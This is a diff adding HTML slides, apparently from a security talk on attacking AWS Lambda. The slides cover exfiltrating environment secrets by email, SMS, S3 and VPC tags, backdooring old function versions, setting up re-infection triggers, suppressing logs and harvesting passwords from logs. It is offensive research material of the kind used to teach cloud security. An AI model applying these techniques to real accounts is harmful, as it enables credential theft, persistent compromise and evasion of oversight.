+            "Action": [
+                "logs:*"
+            ],
+            "Resource": "arn:aws:logs:*:*:*"
+        },
+        {
+            "Effect": "Allow",
+            "Action": [
+                "lambda:InvokeFunction"
+            ],
+            "Resource": [
+                "*"
+            ]
+        },
+        {
+            "Effect": "Allow",
+            "Action": [
+                "kinesis:*"
+            ],
+            "Resource": "arn:aws:kinesis:*:*:*"
+        },
+        {
+            "Effect": "Allow",
+            "Action": [
+                "sns:*"
+            ],
+            "Resource": "arn:aws:sns:*:*:*"
+        },
+        {
+            "Effect": "Allow",
+            "Action": [
+                "sqs:*"
+            ],
+            "Resource": "arn:aws:sqs:*:*:*"
+        },
+    ]
+}
+</pre>
+</div>
+
+<div>
+Or some combination thereof!
+</div>
+
+<div>
+<i>"So how can we use that to our advantage?"</i>
+</div>
+
+<div>
+<i>Part 3: <em>Exfiltration</em></i>
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+<i>"Take the money and run"</i>
+</div>
+
+<div>
+TL;DR:
+</div>
+
+<div>
+Use <em>tags</em>, <em>meta-information</em>, and <em>cloud services</em> themselves to shuttle information when you can't use direct network connections.
+</div>
+
+<div>
+Super easy mode:
+</div>
+
+<div>
+<pre>
+  {
+    "Version": "2012-10-17",
+    "Statement": [
+      {
+        "Effect": "Allow",
+        "Action": [
+          "apigateway:*"
+        ],
+        "Resource": [
+          "*"
+        ]
+      }
+    ]
+  }
+</pre>
+</div>
+
+<div>
+Just `return` through the API Gateway!
+</div>
+
+<div>
+Easy mode:
+</div>
+
+<div>
+<pre>
+  {
+    "Version": "2012-10-17",
+    "Statement": [
+      {
+        "Effect": "Allow",
+        "Action": [
+          "<em>ses</em>:*"
+        ],
+        "Resource": [
+          "*"
+        ]
+      }
+    ]
+  }
+</pre>
+</div>
+
+<!-- import boto.ses
+  connection = boto.ses.connect_to_region(
+      'us-east-1',
+      aws_access_key_id=AWS_ACCESS_KEY,
+      aws_secret_access_key=AWS_SECRET_KEY
+  ) -->
+
+<div>
+<pre>
+ses_connection.send_email(
+    "no-reply@explitable.co",
+    "Your test results",
+    None,
+    "professional.security.researcher@mailinator.com",
+    format='txt',
+    text_body=str(os.environ),
+)
+</pre>
+</div>
+
+<div>
+<pre>
+  {
+    "Version": "2012-10-17",
+    "Statement": [
+      {
+        "Effect": "Allow",
+        "Action": [
+          "<em>sns</em>:*"
+        ],
+        "Resource": [
+          "*"
+        ]
+      }
+    ]
+  }
+</pre>
+</div>
+
+<div>
+<pre>
+sns = boto3.client('sns')
+number = '+15555551234'
+sns.publish(
+    PhoneNumber=number,
+    Message=str(os.environ)
+)
+</pre>
+</div>
+
+<div>
+Slightly harder:
+</div>
+
+<div>
+  <pre>
+  {
+     "Version":"2012-10-17",
+     "Statement":[
+        {
+           "Effect":"Allow",
+           "Action":[
+              "s3:PutObject",
+              "s3:PutObjectTagging",
+              "s3:GetObject",
+              "s3:GetObjectVersion",
+              "s3:DeleteObject",
+              "s3:DeleteObjectVersion",
+              "s3:DeleteObject",
+              "s3:DeleteObjectVersion"
+           ],
+           "Resource":"arn:aws:s3:::our_results_bucket/*"
+        }
+     ]
+  }
+  </pre>
+</div>
+
+<div>
+<ul>
+<li>gzip + encrypt /var/task to /tmp </li>
+<li>Put tarball on S3 </li>
+<li>Download tarball from S3</li>
+<li>Remove tarball</li>
+</ul>
+</div>
+
+<div>
+Fun mode:
+</div>
+
+<!-- <div>
+  <pre>
+  {
+     "Version":"2012-10-17",
+     "Statement":[
+        {
+           "Effect":"Allow",
+           "Action":[
+              "s3:<em>PutObject</em>",
+              "s3:PutObjectTagging",
+              "s3:GetObject",
+              "s3:GetObjectVersion",
+              "s3:DeleteObject",
+              "s3:DeleteObjectVersion",
+              "s3:DeleteObject",
+              "s3:DeleteObjectVersion"
+           ],
+           "Resource":"arn:aws:s3:::*"
+        }
+     ]
+  }
+  </pre>
+</div> -->
+
+<!--
+Return through APIGW.
+Bucket!
+Get creative!
+  - Reading from Object Tags
+- Extracting from VPC
+  - Tag the VPC itself!
+-->
+
+<div>
+VPC exfiltration!
+</div>
+
+<div>
+<img src="http://i.imgur.com/lgHgKtS.jpg">
+<!-- compute cluster -->
+</div>
+
+<div>
+"Amazon VPC provides <em>advanced security features</em> such as security groups and network access control lists to enable inbound and outbound filtering at the instance level and subnet level."
+</div>
+
+<div>
+Sounds bad. It is.
+</div>
+
+<div>
+The good news:
+</div>
+
+<div>
+<em><i>Really</i></em> easy to fuck up!
+</div>
+
+<div>
+Lambda is <em>not inside</em> VPC!
+</div>
+
+<div>
+Lambda <em>has access</em> to VPC resources
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+Lambda is our VPC hole puncher
+</div>
+
+<div>
+"Connect securely to your corporate datacenter – All traffic to and from instances in your VPC can be routed to your corporate datacenter over an industry standard, encrypted IPsec hardware VPN connection."
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+Lambda is our VPC hole puncher..
+</div>
+
+<div>
+..to your internal corporate network.
+</div>
+
+<div>
+But.. we don't even need to actually use the VPC network!
+</div>
+
+<div>
+Exfil from a VPC without touching the VPC network
+</div>
+
+<div>
+Step 0: Upload malicious file to get code execution in Lambda
+</div>
+
+<div>
+<img src="http://i.imgur.com/lgHgKtS.jpg">
+<!-- compute cluster -->
+</div>
+
+<div>
+Step 1: Unleash canaries
+</div>
+
+<div>
+<img src="http://i.imgur.com/lgHgKtS.jpg">
+<!-- compute cluster -->
+</div>
+
+<div>
+Step 2: See that that we have access to VPC resources
+</div>
+
+<div>
+  <pre>
+// AWSLambdaVPCAccessExecutionRole
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "logs:CreateLogGroup",
+        "logs:CreateLogStream",
+        "logs:PutLogEvents",
+        "ec2:<em>CreateNetworkInterface</em>",
+        "ec2:<em>DescribeNetworkInterfaces</em>",
+        "ec2:DeleteNetworkInterface",
+        "s3:PutObject",
+        "sqs:PutMessage"
+      ],
+      "Resource": "*"
+    }
+  ]
+}
+  </pre>
+</div>
+
+<div>
+Step 2: Use SQS + malicious pickle to infect Celery machine inside VPC
+</div>
+
+<div>
+(or a poisoned RPM server)
+</div>
+
+<div>
+(or hijacked DNS server)
+</div>
+
+<div>
+(or a poisoned machine image)
+</div>
+
+<div>
+(or a stolen SSH keypair)
+</div>
+
+<div>
+(or whatever your weapon of choice is here)
+</div>
+
+<div>
+<img src="http://i.imgur.com/lgHgKtS.jpg">
+<!-- compute cluster -->
+</div>
+
+<div>
+Okay - now what?
+</div>
+
+<div>
+<img src="http://i.imgur.com/lgHgKtS.jpg">
+<!-- compute cluster -->
+</div>
+
+<div>
+Step 3: Tag the VPC itself!
+</div>
+
+<div>
+  <pre>
+<span class="grey">// AWSLambdaVPCAccessExecutionRole</span>
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "logs:CreateLogGroup",
+        "logs:CreateLogStream",
+        "logs:PutLogEvents",
+        "ec2:CreateNetworkInterface",
+        "ec2:<em>DescribeNetworkInterfaces</em>",
+        "ec2:DeleteNetworkInterface"
+      ],
+      "Resource": "<em>*</em>"
+    }
+  ]
+}
+  </pre>
+</div>
+
+<div>
+<pre>
+<span class="grey"># Inside VPC</span>
+aws ec2 create-tags --resources i-1234567890abcdef0 \
+  --tags Key=Canary,Value=Dead
+</pre>
+</div>
+
+<div>
+<pre>
+<span class="grey"># Outside VPC, in Lambda</span>
+aws ec2 describe-network-interfaces
+</pre>
+</div>
+
+<div>
+  <pre>
+{
+  "NetworkInterfaces": [
+    ...
+      "TagSet": [{"Canary": "Dead"}],
+    ...
+  ]
+}
+  </pre>
+</div>
+
+<div>
+Boom, baby!
+</div>
+
+<div>
+This even works for application binaries!
+</div>
+
+<div>
+<pre>
+{
+  "B-0-127": "{{Base64 encoded file.. }}",
+  "B-127-255": "{{..Base64 encoded file.. }}",
+  "B-255-383": "{{..Base64 encoded file}}",
+  ...
+}
+</pre>
+</div>
+
+<div>
+Step 4: Push the result through S3!
+</div>
+
+<div>
+<img src="http://i.imgur.com/lgHgKtS.jpg">
+<!-- compute cluster -->
+</div>
+
+<div>
+:D
+</div>
+
+<div>
+Similarly:
+</div>
+
+<div>
+Is the compute cluster able to create..
+</div>
+
+<div>
+Route53 <em>DNS</em> entries?
+</div>
+
+<div>
+CloudWatch <em>Log Groups</em> and Events?
+</div>
+
+<div>
+SQS <em>Queues</em>? S3 <em>Buckets</em>? Kinesis <em>Streams</em>?
+</div>
+
+<div>
+Be creative!
+</div>
+
+<div>
+A <em>single overlapping permission</em> and be enough for data exfiltration!
+</div>
+
+<div>
+<i>"Cool!.. But what if they fix the bug?"</i>
+</div>
+
+<div>
+Part 4: <em>Persistence</em>
+</div>
+
+<!-- <div>
+Challenges:
+</div>
+ -->
+
+<div>
+aka
+</div>
+
+<div>
+<i>"How we can permanantly infect a system with <em>no permanent infrastructure</em>?"</i>
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+<i>"Abusing cloud vendor features, cont'd!"</i>
+</div>
+
+<div>
+Neat Lambda feature:
+</div>
+
+<div>
+arn:aws:lambda:aws-region:acct-id:function:helloworld:<em>$LATEST</em>
+</div>
+
+<div>
+AWS stores old function sources
+</div>
+
+<div>
+Useful for:
+</div>
+
+<div>
+Rollbacks!
+</div>
+
+<div>
+Dev/Prod separation!
+</div>
+
+<div>
+Auditing!
+</div>
+
+<div>
+Persisting <em>malware</em>! :D
+</div>
+
+<div>
+<pre>
+function = \
+  lambda_client.get_function(
+    FunctionName='function:{}:{}'.format(
+      function_name,
+      <em>1</em>
+    )
+  )
+</pre>
+</div>
+
+<div>
+<pre>
+function_code = requests.get(function['Code']['Location'])
+</pre>
+</div>
+
+<div>
+<pre>
+lambda_client.update_function_code(
+  FunctionName=function_name + <em>":1"</em>,
+  ZipFile=<em>our_backdoored_package</em>,
+  Publish=False
+)
+</pre>
+</div>
+
+<div>
+Alternate route:
+</div>
+
+<div>
+(Especially useful if application is managed/deployed by CI)
+</div>
+
+<div>
+CloudFormation templates depend on <em>S3-hosted</em> code package</i>
+</div>
+
+<div>
+Updates to the production stack will call the infected package! :)
+</div>
+
+<div>
+  <ul>
+    <li>Get package from S3</li>
+    <li>Infect</li>
+    <li>Reupload to same location</li>
+    <li>Update stack / wait for CI to update stack</li>
+  </ul>
+</div>
+
+<div>
+We can even attack <i>other</i> Lambda functions this way!
+</div>
+
+<div>
+EXAMPLE IMAGE HERE
+</div>
+
+<div>
+One better:
+</div>
+
+<div>
+Think <em>serverlessly</em>!
+</div>
+
+<div>
+  <ul>
+    <li>Hide malware in old function code</li>
+    <li>Create infection handler</li>
+    <li>Register upload to code-hosting bucket as trigger</li>
+    <li>Update CF stack</li>
+  </ul>
+</div>
+
+<div>
+New code uploads are the trigger for re-infection!
+</div>
+
+<!--
+- Copy to /tmp, infect, package, upload to S3
+  - Manually update
+  - Or, if using CloudFormation, wait for something in the stack to update
+- Hide in old versions
+- Register an infection event source!
+-->
+
+<!--
+
+response = self.lambda_client.get_function(FunctionName='function:{}:{}'.format(function_name, revisions[versions_back]))
+response = requests.get(response['Code']['Location'])
+
+if response.status_code != 200:
+    print("Failed to get version {} of {} code".format(versions_back, function_name))
+    return False
+
+response = self.lambda_client.update_function_code(FunctionName=function_name, ZipFile=response.content, Publish=publish)  # pragma: no cover
+
+-->
+
+
+<div>
+<i>Part 5: <em>Cleaning Up</em></i>
+</div>
+
+<div>
+Full disclosure:
+</div>
+
+<div>
+I am not very tidy.
+</div>
+
+<div>
+(You should see my bedroom.)
+</div>
+
+<div>
+Be warned.
+</div>
+
+<div>
+Okay:
+</div>
+
+<div>
+All Lambda executions have execution IDs.
+</div>
+
+<div>
+Remeber these and delete them.
+</div>
+
+<div>
+But could still trigger the CW alarms!
+</div>
+
+<div>
+<i>"Hmm.. can we just hop off the log group?"</i>
+</div>
+
+<div>
+<pre>
+{
+  "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
+  "LAMBDA_TASK_ROOT": "/var/task",
+  "PATH": /usr/local/bin:/usr/bin/:/bin",
+  "LD_LIBRARY_PATH": "/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib",
+  "LANG": "en_US.UTF-8",
+  "AWS_LAMBDA_FUNCTION_NAME": "your-function-name",
+  "AWS_REGION": "us-east-1",
+  "AWS_SESSION_TOKEN": "FXXDYXdzEK3//////////SFLKJBSKKLDJFLKJDFLSKJDFLSKJDFLSKJDFLKAJDSLKJHSGF",
+  "AWS_SECURITY_TOKEN": "FXXoDYZdzEK3//////////WELKSDJFLKABFDJa88asdf8asdfF==",
+  "LAMBDA_RUNTIME_DIR": "/var/runtime",
+  "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "512",
+  "PYTHONPATH": "/var/runtime",
+  "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/your-function-name",
+  "AWS_LAMBDA_LOG_STREAM_NAME": "2016/12/13/[$LATEST]448bf3a99b754fe781006b5f6358b67b",
+  "AWS_ACCESS_KEY_ID": "AXYGJHW2H6VG3573NLBQ",
+  "AWS_DEFAULT_REGION": "us-east-1",
+  "AWS_SECRET_ACCESS_KEY: "Wm6QDAOK/lskadfjalskdfJFslakdfj82"
+}
+</pre>
+</div>
+
+<div>
+<pre>
+{
+  "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
+  "LAMBDA_TASK_ROOT": "/var/task",
+  "PATH": /usr/local/bin:/usr/bin/:/bin",
+  "LD_LIBRARY_PATH": "/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib",
+  "LANG": "en_US.UTF-8",
+  "AWS_LAMBDA_FUNCTION_NAME": "your-function-name",
+  "AWS_REGION": "us-east-1",
+  "AWS_SESSION_TOKEN": "FXXDYXdzEK3//////////SFLKJBSKKLDJFLKJDFLSKJDFLSKJDFLSKJDFLKAJDSLKJHSGF",
+  "AWS_SECURITY_TOKEN": "FXXoDYZdzEK3//////////WELKSDJFLKABFDJa88asdf8asdfF==",
+  "LAMBDA_RUNTIME_DIR": "/var/runtime",
+  "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "512",
+  "PYTHONPATH": "/var/runtime",
+  "<em>AWS_LAMBDA_LOG_GROUP_NAME</em>": "/aws/lambda/your-function-name",
+  "<em>AWS_LAMBDA_LOG_STREAM_NAME</em>": "2016/12/13/[$LATEST]448bf3a99b754fe781006b5f6358b67b",
+  "AWS_ACCESS_KEY_ID": "AXYGJHW2H6VG3573NLBQ",
+  "AWS_DEFAULT_REGION": "us-east-1",
+  "AWS_SECRET_ACCESS_KEY: "Wm6QDAOK/lskadfjalskdfJFslakdfj82"
+}
+</pre>
+</div>
+
+<div>
+Doesn't work. :(
+</div>
+
+<div>
+But..
+</div>
+
+<div>
+Retention policy!
+</div>
+
+<div>
+<pre>
+log_client = boto3.client('logs')
+response = log_client.<em>put_retention_policy</em>(
+    logGroupName=os.environ['<em>AWS_LAMBDA_LOG_GROUP_NAME</em>'],
+    <em>retentionInDays=1</em>
+)
+</pre>
+</div>
+
+<div>
+¯\_(ツ)_/¯
+</div>
+
+<div>
+Better yet:
+</div>
+
+<div>
+Don't log anything to begin with!
+</div>
+
+<div>
+<pre>
+{
+  "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
+  "LAMBDA_TASK_ROOT": "/var/task",
+  "PATH": /usr/local/bin:/usr/bin/:/bin",
+  "LD_LIBRARY_PATH": "/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib",
+  "LANG": "en_US.UTF-8",
+  "AWS_LAMBDA_FUNCTION_NAME": "your-function-name",
+  "AWS_REGION": "us-east-1",
+  "AWS_SESSION_TOKEN": "FXXDYXdzEK3//////////SFLKJBSKKLDJFLKJDFLSKJDFLSKJDFLSKJDFLKAJDSLKJHSGF",
+  "AWS_SECURITY_TOKEN": "FXXoDYZdzEK3//////////WELKSDJFLKABFDJa88asdf8asdfF==",
+  "LAMBDA_RUNTIME_DIR": "/var/runtime",
+  "<em>AWS_LAMBDA_FUNCTION_MEMORY_SIZE</em>": "<em>512</em>",
+  "PYTHONPATH": "/var/runtime",
+  "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/your-function-name",
+  "AWS_LAMBDA_LOG_STREAM_NAME": "2016/12/13/[$LATEST]448bf3a99b754fe781006b5f6358b67b",
+  "AWS_ACCESS_KEY_ID": "AXYGJHW2H6VG3573NLBQ",
+  "AWS_DEFAULT_REGION": "us-east-1",
+  "AWS_SECRET_ACCESS_KEY: "Wm6QDAOK/lskadfjalskdfJFslakdfj82"
+}
+</pre>
+</div>
+
+<div>
+If exhaust the memory of the function,
+</div>
+
+<div>
+there's not enough left to log properly!
+</div>
+
+<div>
+<pre>
+<em>try</em>:
+    hack_the_gibson()
+<em>except</em> Exception as e:
+    <span class="grey"># Don't leave enough memory to properly report the error.</span>
+    allocator = <em>' '</em> * <em>512000000000</em>
+</pre>
+</div>
+
+<div>
+<img src="http://i.imgur.com/qI0LdkS.png">
+</div>
+
+<div>
+Yay!
+</div>
+
+<div>
+Caveat!:
+</div>
+
+<div>
+<pre>
+logger.info(event)
+</pre>
+</div>
+
+<div>
+Will reveal your attack :(
+</div>
+
+<div>
+☁:
+</div>
+
+<div>
+<pre>
+streams = logs_client.describe_log_streams(
+    logGroupName=os.environ['<em>AWS_LAMBDA_LOG_GROUP_NAME</em>']
+)
+all_streams = streams['logStreams']
+all_names = [stream['logStreamName'] for stream in all_streams]
+response = logs_client.filter_log_events(
+    logGroupName=log_name,
+    logStreamNames=all_names
+)
+</pre>
+</div>
+
+<div>
+<pre>
+{
+   "body": "{
+      \"<em>username</em>\": "\<em>jeffb</em>\",
+      \"<em>password</em>\": \"<em>i_l0ve_y0ur_m0n3y</em>\"
+   }",
+   "httpMethod": "POST",
+   "resource": "/signup",
+   "queryStringParameters": null,
+   "requestContext": { .. },
+   "headers": { .. },
+   "stageVariables": null,
+   "path": "/signup",
+   "pathParameters": null
+}
+</pre>
+</div>
+
+<div>
+Pillage logs for plaintext <em>user</em>:<em>pass</em> in POST!
+</div>
+
+<!--
+
+All Lambda executions have an ID
+  - Tag them, delete after.
+- Most
+  - (CI systems might?)
+- RAM depletion - doesn't count as an invocation error,
+  - nothing of value logged
+- Make sure there are no other loggers (Sentry, etc)
+
+-->
+
+<div>
+Part 4: <em>Synthesis</em>
+</div>
+
+<div>
+🎅
+</div>
+
+<div>
+HO HO HO
+</div>
+
+<div>
+🎁
+</div>
+
+<div>
+AWS Lambda Infection Toolkit!
+</div>
+
+<div>
+<pre>
+mackenzie@0.1.0
+</pre>
+</div>
+
+<div>
+<pre>
+* Harvest valuable goodies
+* Encrypt with pubkey
+* Exfil via POST, S3, Email, SMS, Network Resources Tags
+* Install Flask backdoor
+* Infect old pacakage sources
+* Infect all available functions
+* Create re-infection handlers
+* Your feature here?
+</pre>
+</div>
+
+<div>
+<pre>
+http://github.com/Miserlou/mackenzie
+</pre>
+</div>
+
+<div>
+In conclusion:
+</div>
+
+<div>
+Server-less architectures present new <em>obstacles</em>,
+</div>
+
+<div>
+but we can defeat those obstacles by <em>abusing cloud features</em> themselves.
+</div>
+
+<div>
+You need secure server-less apps?
+</div>
+
+<div>
+Hire me! 💸💸💸
+</div>
+
+<div>
+Want to <em>contribute</em>? 😃
+</div>
+
+<div>
+<em>Code</em>:
+https://github.com/Miserlou/Zappa
+https://github.com/Miserlou/mackenzie
+</em>
+</div>
+
+<div>
+<em>Slack</em>:
+http://slack.zappa.io
+</em>
+</div>
+
+<div>
+<em>Thank you</em>!
+
+@GUNdotIO
+https://gun.io
+
+https://richjones.com
+</div>
+
+<div>
+Questions?
+</div>
+
+</body>
+</html>
